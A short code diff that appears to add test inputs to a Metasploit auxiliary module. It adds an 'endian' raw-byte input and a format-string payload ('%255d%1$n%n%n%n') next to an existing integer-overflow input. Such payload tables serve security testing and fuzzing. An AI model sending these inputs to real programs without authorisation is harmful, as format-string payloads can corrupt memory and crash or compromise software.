@@ -72,6 +72,14 @@ class Metasploit3 < Msf::Auxiliary
 			2 => [
 				'[Basic] Integer Over Flow',
 				"echo 2147478598; echo 2147478598"
+			],
+			3 => [
+				'[Basic] endian?',
+				"echo -e '\\01\\00\\00\\00\\00'"
+			],
+			6 => [
+				'[Basic] endian with format string',
+				"echo '%255d%1$n%n%n%n'"
 			]
 		}
 
